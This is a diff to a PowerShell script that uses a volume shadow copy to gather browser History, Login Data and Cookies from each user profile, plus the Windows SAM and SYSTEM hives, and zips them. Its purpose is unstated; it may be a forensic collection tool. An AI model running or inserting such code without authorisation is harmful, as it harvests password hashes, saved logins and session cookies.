@@ -26,7 +26,7 @@ param (
         Copy-Item -Force ($profile.Directory.FullName + '\History') -Destination $aBrowserProfileDestDir
         Copy-Item -Force ($profile.Directory.FullName + '\Login Data') -Destination $aBrowserProfileDestDir
         $aBrowserCookPath = ($($volume.DeviceObject) + '\' + ($profile.Directory.FullName).Substring(2) + '\Network\Cookies')
-        cmd /c copy $aBrowserCookPath $aBrowserProfileDestDir
+        cmd /c copy /y $aBrowserCookPath $aBrowserProfileDestDir
     }
 }
 
@@ -54,10 +54,12 @@ param (
     $id = (Get-WmiObject -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
     $volume = (Get-WmiObject win32_shadowcopy -filter "ID='$id'")
 
-    $samPath = ($($volume.DeviceObject) + '\Windows\System32\SAM')
-    $sysPath = ($($volume.DeviceObject) + '\Windows\System32\SYSTEM')
-    cmd /c copy $samPath ($browsersDestDir + 'SAM')
-    cmd /c copy $sysPath ($browsersDestDir + 'SYS')
+    if (((Test-Path ($browsersDestDir + 'SAM')) -eq $false) -and ((Test-Path ($browsersDestDir + 'SYS')) -eq $false)) {
+        $samPath = ($($volume.DeviceObject) + '\Windows\System32\SAM')
+        $sysPath = ($($volume.DeviceObject) + '\Windows\System32\SYSTEM')
+        cmd /c copy /y $samPath ($browsersDestDir + 'SAM')
+        cmd /c copy /y $sysPath ($browsersDestDir + 'SYS')
+    }
 
     foreach ($usersDir in (gci $srcdir)) {
         IF (($usersDir.Name -eq "Public") -OR ($usersDir.Name -eq "All Users") -OR ($usersDir.Name -eq "Default User") -OR ($usersDir.Name -eq "Default")) { continue }
@@ -72,5 +74,5 @@ param (
     $volume.Delete()
     if($notrunning -eq 1) { $VSsvc.Stop() }
 
-    Compress-Archive $browsersDestDir -Destination ($destDir + '\' + $objName + '_Browsers_' + $currDateTime + '.zip')
+    Compress-Archive $browsersDestDir -Destination ($baseDir + '\' + $objName + '_Browsers_' + $currDateTime + '.zip')
 }
